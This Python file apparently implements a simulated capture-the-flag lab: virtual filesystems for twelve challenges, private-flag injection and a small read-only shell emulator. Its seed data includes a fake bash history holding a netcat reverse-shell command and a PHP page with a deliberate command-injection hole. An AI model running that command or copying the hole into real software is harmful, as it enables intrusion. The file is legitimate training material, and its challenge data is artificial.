from __future__ import annotations

from dataclasses import dataclass
from fnmatch import fnmatch
import json
import os
from pathlib import Path
import posixpath
import shlex


class ChallengeLabServiceError(Exception):
    """Base exception for challenge lab failures."""


class ChallengeLabUnavailableError(ChallengeLabServiceError):
    """Raised when no lab is configured for a challenge."""


@dataclass(frozen=True, slots=True)
class ChallengeLabCommandResult:
    output: str
    cwd: str
    exit_code: int


class _VirtualFilesystem:
    def __init__(self, files: dict[str, str]) -> None:
        self._files = {self.normalize_path(path): content for path, content in files.items()}
        self._directories = self._derive_directories(self._files)

    @staticmethod
    def normalize_path(path: str) -> str:
        normalized = posixpath.normpath(path.strip() or "/")
        if not normalized.startswith("/"):
            normalized = f"/{normalized}"
        return normalized or "/"

    def resolve(self, cwd: str, target: str) -> str:
        if target.startswith("/"):
            return self.normalize_path(target)
        return self.normalize_path(posixpath.join(cwd, target))

    def exists(self, path: str) -> bool:
        normalized = self.normalize_path(path)
        return normalized in self._files or normalized in self._directories

    def is_file(self, path: str) -> bool:
        return self.normalize_path(path) in self._files

    def is_dir(self, path: str) -> bool:
        return self.normalize_path(path) in self._directories

    def read_file(self, path: str) -> str:
        return self._files[self.normalize_path(path)]

    def list_dir(self, path: str, show_all: bool) -> list[str]:
        normalized = self.normalize_path(path)
        prefix = "/" if normalized == "/" else f"{normalized}/"
        children: set[str] = set()

        for candidate in self._directories | set(self._files.keys()):
            if candidate == normalized:
                continue
            if not candidate.startswith(prefix):
                continue
            remainder = candidate[len(prefix) :]
            if not remainder:
                continue
            children.add(remainder.split("/", maxsplit=1)[0])

        visible = sorted(name for name in children if show_all or not name.startswith("."))
        if show_all:
            return [".", "..", *visible]
        return visible

    def iter_files_under(self, path: str, recursive: bool) -> list[str]:
        normalized = self.normalize_path(path)
        if self.is_file(normalized):
            return [normalized]
        if not self.is_dir(normalized):
            return []

        prefix = "/" if normalized == "/" else f"{normalized}/"
        files = []
        for file_path in sorted(self._files):
            if not file_path.startswith(prefix):
                continue
            remainder = file_path[len(prefix) :]
            if not recursive and "/" in remainder:
                continue
            files.append(file_path)
        return files

    def walk(self, path: str) -> list[str]:
        normalized = self.normalize_path(path)
        if not self.exists(normalized):
            return []
        if self.is_file(normalized):
            return [normalized]

        prefix = "/" if normalized == "/" else f"{normalized}/"
        nodes = [normalized]
        for directory in sorted(self._directories):
            if directory == normalized:
                continue
            if directory.startswith(prefix):
                nodes.append(directory)
        for file_path in sorted(self._files):
            if file_path.startswith(prefix):
                nodes.append(file_path)
        return nodes

    @staticmethod
    def _derive_directories(files: dict[str, str]) -> set[str]:
        directories = {"/"}
        for file_path in files:
            parent = posixpath.dirname(file_path)
            while parent:
                directories.add(parent)
                if parent == "/":
                    break
                parent = posixpath.dirname(parent)
        return directories


class ChallengeLabService:
    _BACKEND_ROOT = Path(__file__).resolve().parents[2]
    _DEFAULT_PRIVATE_FLAGS_FILE = _BACKEND_ROOT / "config" / "seeds" / "private-flags.json"
    _MISSING_FLAG_MARKER = "[flag unavailable: private mapping not configured]"
    _REDACTED_FLAG_VALUES = {
        "REDACTED",
        "REDACTED_USE_PRIVATE_FLAGS_FILE",
        "__REDACTED__",
        "__USE_PRIVATE_FLAGS_FILE__",
    }

    _M11_FILES: dict[str, str] = {
        "/etc/motd": "Authorized access only.",
        "/etc/nginx/nginx.conf": (
            "user nginx;\n"
            "worker_processes auto;\n"
            "include /etc/nginx/conf.d/site.conf;\n"
        ),
        "/etc/nginx/conf.d/site.conf": (
            "server_name internal-app.local;\n"
            "include /etc/nginx/conf.d/.legacy.conf;\n"
        ),
        "/etc/nginx/conf.d/.legacy.conf": (
            "# Temporary migration include chain\n"
            "include /etc/.config_chain/.indicator.conf;\n"
        ),
        "/etc/.config_chain/.indicator.conf": (
            "indicator_file=/etc/.config_chain/.indicator.txt\n"
            "mode=legacy\n"
        ),
        "/etc/.config_chain/.indicator.txt": "indicator=ready\n",
        "/etc/ssh/sshd_config": (
            "PermitRootLogin no\n"
            "PasswordAuthentication no\n"
        ),
    }

    _M12_FILES: dict[str, str] = {
        "/home/user/notes.txt": "I left the flag in /var/lib/secret/flag.txt\n",
        "/var/lib/secret/flag.txt": "flag file provisioned at runtime\n",
    }
    _M13_FILES: dict[str, str] = {
        "/usr/bin/bash": "ELF binary (suid)\n",
        "/etc/shadow": "root:$6$xyz...:19000:0:99999:7:::\n",
        "/root/flag.txt": "flag file provisioned at runtime\n",
    }
    _M14_FILES: dict[str, str] = {
        "/etc/crontab": "* * * * * root /usr/local/bin/backup.sh *\n",
        "/usr/local/bin/backup.sh": "tar -czf /var/backups/data.tar.gz /data/*\n",
        "/data/flag.txt": "flag file provisioned at runtime\n",
    }
    _M15_FILES: dict[str, str] = {
        "/etc/shadow": "admin:$1$abc$12345/hashed:19000:0:99999:7:::\n (Hint: MD5 crypt is weak)\n",
    }
    _M16_FILES: dict[str, str] = {
        "/home/user/.bash_history": "nc -e /bin/bash 10.0.0.5 4444\n",
        "/tmp/notes.txt": "Reverse shell dropped.\n",
    }
    _M17_FILES: dict[str, str] = {
        "/var/www/html/ping.php": "<?php system('ping -c 4 ' . $_GET['ip']); ?>\n",
        "/var/www/html/flag.txt": "flag file provisioned at runtime\n",
    }
    _M18_FILES: dict[str, str] = {
        "/etc/ld.so.preload": "/tmp/hook.so\n",
        "/tmp/notes.txt": "Used LD_PRELOAD to get root.\n",
    }
    _M19_FILES: dict[str, str] = {
        "/proc/version": "Linux version 2.6.22 (gcc version 4.1.2)\n",
        "/home/user/exploit.c": "// Dirty COW exploit\n",
        "/root/flag.txt": "flag file provisioned at runtime\n",
    }
    _M20_FILES: dict[str, str] = {
        "/var/log/auth.log": "Failed password for root from 10.0.0.2 port 22 ssh2\nFailed password for root from 10.0.0.2 port 22 ssh2\nAccepted password for root from 10.0.0.2 port 22 ssh2\n",
        "/root/flag.txt": "flag file provisioned at runtime\n",
    }
    _M21_FILES: dict[str, str] = {
        "/proc/sys/kernel/yama/ptrace_scope": "0\n",
        "/home/user/notes.txt": "ptrace_scope is 0, we can inject into processes.\n",
    }
    _M22_FILES: dict[str, str] = {
        "/root/nmap_scan.xml": "<nmaprun><host><ports><port protocol='tcp' portid='22'><state state='open'/></port></ports></host></nmaprun>\n",
        "/root/flag.txt": "flag file provisioned at runtime\n",
    }

    _LAB_FLAG_TEMPLATES: dict[str, dict[str, str]] = {
        "m11-hidden-in-etc": {
            "/etc/.config_chain/.indicator.txt": "{flag}",
        },
        "m12-permission-denied": {
            "/var/lib/secret/flag.txt": "{flag}\n",
        },
        "m13-suid-secrets": {
            "/root/flag.txt": "{flag}\n",
        },
        "m14-cron-exploit": {
            "/data/flag.txt": "{flag}\n",
        },
        "m15-shadow-hunter": {
            "/etc/shadow": "admin:$1$abc$12345/hashed:19000:0:99999:7:::\n (Hint: MD5 crypt is weak)\n\n{flag}",
        },
        "m16-reverse-shell-drop": {
            "/tmp/notes.txt": "Reverse shell dropped. Flag: {flag}\n",
        },
        "m17-bash-injection": {
            "/var/www/html/flag.txt": "{flag}\n",
        },
        "m18-root-me": {
            "/tmp/notes.txt": "Used LD_PRELOAD to get root. Flag: {flag}\n",
        },
        "m19-kernel-panic": {
            "/root/flag.txt": "{flag}\n",
        },
        "m20-log-miner": {
            "/root/flag.txt": "{flag}\n",
        },
        "m21-zombie-process": {
            "/home/user/notes.txt": "ptrace_scope is 0, we can inject into processes. Flag: {flag}\n",
        },
        "m22-kali-recon-lab": {
            "/root/flag.txt": "{flag}\n",
        },
    }

    def __init__(self) -> None:
        lab_files: dict[str, dict[str, str]] = {
            "m11-hidden-in-etc": dict(self._M11_FILES),
            "m12-permission-denied": dict(self._M12_FILES),
            "m13-suid-secrets": dict(self._M13_FILES),
            "m14-cron-exploit": dict(self._M14_FILES),
            "m15-shadow-hunter": dict(self._M15_FILES),
            "m16-reverse-shell-drop": dict(self._M16_FILES),
            "m17-bash-injection": dict(self._M17_FILES),
            "m18-root-me": dict(self._M18_FILES),
            "m19-kernel-panic": dict(self._M19_FILES),
            "m20-log-miner": dict(self._M20_FILES),
            "m21-zombie-process": dict(self._M21_FILES),
            "m22-kali-recon-lab": dict(self._M22_FILES),
        }
        self._inject_runtime_flags(lab_files, self._load_private_flags())
        self._labs = {slug: _VirtualFilesystem(files) for slug, files in lab_files.items()}

    @classmethod
    def _inject_runtime_flags(
        cls,
        lab_files: dict[str, dict[str, str]],
        private_flags: dict[str, str],
    ) -> None:
        for slug, templates in cls._LAB_FLAG_TEMPLATES.items():
            files = lab_files.get(slug)
            if files is None:
                continue

            runtime_flag = private_flags.get(slug)
            resolved_flag = runtime_flag.strip() if runtime_flag else cls._MISSING_FLAG_MARKER
            if not resolved_flag:
                resolved_flag = cls._MISSING_FLAG_MARKER

            for file_path, template in templates.items():
                files[file_path] = template.format(flag=resolved_flag)

    @classmethod
    def _load_private_flags(cls) -> dict[str, str]:
        flags_file = cls._resolve_private_flags_file()
        if flags_file is None or not flags_file.exists():
            return {}

        try:
            payload = json.loads(flags_file.read_text(encoding="utf-8"))
        except (OSError, json.JSONDecodeError):
            return {}

        if not isinstance(payload, dict):
            return {}

        normalized_flags: dict[str, str] = {}
        for raw_slug, raw_flag in payload.items():
            slug = str(raw_slug).strip().lower()
            flag = str(raw_flag).strip()
            if not slug or cls._is_redacted_flag(flag):
                continue
            normalized_flags[slug] = flag

        return normalized_flags

    @classmethod
    def _resolve_private_flags_file(cls) -> Path | None:
        configured_path = os.getenv("LAB_PRIVATE_FLAGS_FILE")
        if configured_path is None:
            return cls._DEFAULT_PRIVATE_FLAGS_FILE

        normalized = configured_path.strip()
        if not normalized:
            return None

        candidate = Path(normalized).expanduser()
        if candidate.is_absolute():
            return candidate
        return cls._BACKEND_ROOT / candidate

    @classmethod
    def _is_redacted_flag(cls, value: str) -> bool:
        normalized = value.strip()
        if not normalized:
            return True
        if normalized in cls._REDACTED_FLAG_VALUES:
            return True
        return normalized.upper().startswith("REDACTED_")

    def has_lab(self, challenge_slug: str) -> bool:
        return challenge_slug in self._labs

    def execute_command(self, challenge_slug: str, command: str, cwd: str) -> ChallengeLabCommandResult:
        filesystem = self._labs.get(challenge_slug)
        if filesystem is None:
            raise ChallengeLabUnavailableError("Lab unavailable for this challenge.")

        normalized_cwd = filesystem.normalize_path(cwd or "/")
        if not filesystem.is_dir(normalized_cwd):
            normalized_cwd = "/"

        command_text = command.strip()
        if not command_text:
            return ChallengeLabCommandResult(output="", cwd=normalized_cwd, exit_code=0)

        try:
            tokens = shlex.split(command_text)
        except ValueError as exc:
            return ChallengeLabCommandResult(output=f"parse error: {exc}", cwd=normalized_cwd, exit_code=1)

        if not tokens:
            return ChallengeLabCommandResult(output="", cwd=normalized_cwd, exit_code=0)

        name = tokens[0]
        args = tokens[1:]

        if name == "help":
            return ChallengeLabCommandResult(
                output=(
                    "Supported commands: help, pwd, ls, cd, cat, grep, find\n"
                    "Examples:\n"
                    "  ls -la /etc\n"
                    "  grep -R include /etc\n"
                    "  find /etc -name '*.conf'"
                ),
                cwd=normalized_cwd,
                exit_code=0,
            )
        if name == "pwd":
            return ChallengeLabCommandResult(output=normalized_cwd, cwd=normalized_cwd, exit_code=0)
        if name == "cd":
            return self._cmd_cd(filesystem, normalized_cwd, args)
        if name == "ls":
            return self._cmd_ls(filesystem, normalized_cwd, args)
        if name == "cat":
            return self._cmd_cat(filesystem, normalized_cwd, args)
        if name == "grep":
            return self._cmd_grep(filesystem, normalized_cwd, args)
        if name == "find":
            return self._cmd_find(filesystem, normalized_cwd, args)

        return ChallengeLabCommandResult(
            output=f"{name}: command not found",
            cwd=normalized_cwd,
            exit_code=127,
        )

    def _cmd_cd(self, filesystem: _VirtualFilesystem, cwd: str, args: list[str]) -> ChallengeLabCommandResult:
        target = "/" if not args else args[0]
        if len(args) > 1:
            return ChallengeLabCommandResult(output="cd: too many arguments", cwd=cwd, exit_code=1)

        destination = filesystem.resolve(cwd, target)
        if not filesystem.exists(destination):
            return ChallengeLabCommandResult(
                output=f"cd: {target}: No such file or directory",
                cwd=cwd,
                exit_code=1,
            )
        if not filesystem.is_dir(destination):
            return ChallengeLabCommandResult(
                output=f"cd: {target}: Not a directory",
                cwd=cwd,
                exit_code=1,
            )
        return ChallengeLabCommandResult(output="", cwd=destination, exit_code=0)

    def _cmd_ls(self, filesystem: _VirtualFilesystem, cwd: str, args: list[str]) -> ChallengeLabCommandResult:
        show_all = False
        target: str | None = None

        for arg in args:
            if arg.startswith("-"):
                for flag in arg[1:]:
                    if flag == "a":
                        show_all = True
                    elif flag == "l":
                        # accepted for familiarity; output remains simple listing
                        continue
                    else:
                        return ChallengeLabCommandResult(
                            output=f"ls: invalid option -- '{flag}'",
                            cwd=cwd,
                            exit_code=1,
                        )
                continue

            if target is not None:
                return ChallengeLabCommandResult(
                    output="ls: too many operands",
                    cwd=cwd,
                    exit_code=1,
                )
            target = arg

        path = filesystem.resolve(cwd, target or ".")
        if not filesystem.exists(path):
            return ChallengeLabCommandResult(
                output=f"ls: cannot access '{target or '.'}': No such file or directory",
                cwd=cwd,
                exit_code=1,
            )

        if filesystem.is_file(path):
            return ChallengeLabCommandResult(
                output=posixpath.basename(path),
                cwd=cwd,
                exit_code=0,
            )

        listing = filesystem.list_dir(path, show_all=show_all)
        return ChallengeLabCommandResult(output="\n".join(listing), cwd=cwd, exit_code=0)

    def _cmd_cat(self, filesystem: _VirtualFilesystem, cwd: str, args: list[str]) -> ChallengeLabCommandResult:
        if not args:
            return ChallengeLabCommandResult(output="cat: missing file operand", cwd=cwd, exit_code=1)

        chunks: list[str] = []
        for raw_path in args:
            path = filesystem.resolve(cwd, raw_path)
            if not filesystem.exists(path):
                return ChallengeLabCommandResult(
                    output=f"cat: {raw_path}: No such file or directory",
                    cwd=cwd,
                    exit_code=1,
                )
            if filesystem.is_dir(path):
                return ChallengeLabCommandResult(
                    output=f"cat: {raw_path}: Is a directory",
                    cwd=cwd,
                    exit_code=1,
                )

            content = filesystem.read_file(path).rstrip("\n")
            if len(args) > 1:
                chunks.append(f"==> {path} <==")
            chunks.append(content)

        return ChallengeLabCommandResult(output="\n".join(chunks), cwd=cwd, exit_code=0)

    def _cmd_grep(self, filesystem: _VirtualFilesystem, cwd: str, args: list[str]) -> ChallengeLabCommandResult:
        recursive = False
        index = 0
        while index < len(args) and args[index].startswith("-"):
            options = args[index][1:]
            for option in options:
                if option in {"r", "R"}:
                    recursive = True
                else:
                    return ChallengeLabCommandResult(
                        output=f"grep: invalid option -- '{option}'",
                        cwd=cwd,
                        exit_code=1,
                    )
            index += 1

        remaining = args[index:]
        if len(remaining) < 2:
            return ChallengeLabCommandResult(
                output="usage: grep [-r|-R] PATTERN PATH",
                cwd=cwd,
                exit_code=1,
            )

        pattern, raw_path = remaining[0], remaining[1]
        path = filesystem.resolve(cwd, raw_path)
        if not filesystem.exists(path):
            return ChallengeLabCommandResult(
                output=f"grep: {raw_path}: No such file or directory",
                cwd=cwd,
                exit_code=1,
            )
        if filesystem.is_dir(path) and not recursive:
            return ChallengeLabCommandResult(
                output=f"grep: {raw_path}: Is a directory",
                cwd=cwd,
                exit_code=1,
            )

        if not pattern:
            return ChallengeLabCommandResult(output="grep: empty pattern", cwd=cwd, exit_code=1)

        matches: list[str] = []
        for file_path in filesystem.iter_files_under(path, recursive=recursive):
            for line_no, line in enumerate(filesystem.read_file(file_path).splitlines(), start=1):
                # Intentionally literal matching to avoid regex-based abuse patterns.
                if pattern in line:
                    matches.append(f"{file_path}:{line_no}:{line}")

        if not matches:
            return ChallengeLabCommandResult(output="", cwd=cwd, exit_code=1)

        return ChallengeLabCommandResult(output="\n".join(matches), cwd=cwd, exit_code=0)

    def _cmd_find(self, filesystem: _VirtualFilesystem, cwd: str, args: list[str]) -> ChallengeLabCommandResult:
        if not args:
            return ChallengeLabCommandResult(
                output="usage: find PATH [-type f|d] [-name GLOB]",
                cwd=cwd,
                exit_code=1,
            )

        raw_path = args[0]
        query_path = filesystem.resolve(cwd, raw_path)
        if not filesystem.exists(query_path):
            return ChallengeLabCommandResult(
                output=f"find: '{raw_path}': No such file or directory",
                cwd=cwd,
                exit_code=1,
            )

        type_filter: str | None = None
        name_glob: str | None = None
        index = 1
        while index < len(args):
            token = args[index]
            if token == "-type":
                if index + 1 >= len(args):
                    return ChallengeLabCommandResult(output="find: missing argument to '-type'", cwd=cwd, exit_code=1)
                type_filter = args[index + 1]
                if type_filter not in {"f", "d"}:
                    return ChallengeLabCommandResult(
                        output=f"find: unknown argument to -type: {type_filter}",
                        cwd=cwd,
                        exit_code=1,
                    )
                index += 2
                continue

            if token == "-name":
                if index + 1 >= len(args):
                    return ChallengeLabCommandResult(output="find: missing argument to '-name'", cwd=cwd, exit_code=1)
                name_glob = args[index + 1]
                index += 2
                continue

            return ChallengeLabCommandResult(
                output=f"find: unsupported predicate '{token}'",
                cwd=cwd,
                exit_code=1,
            )

        results: list[str] = []
        for candidate in filesystem.walk(query_path):
            if type_filter == "f" and not filesystem.is_file(candidate):
                continue
            if type_filter == "d" and not filesystem.is_dir(candidate):
                continue
            if name_glob and not fnmatch(posixpath.basename(candidate), name_glob):
                continue
            results.append(candidate)

        return ChallengeLabCommandResult(output="\n".join(results), cwd=cwd, exit_code=0)
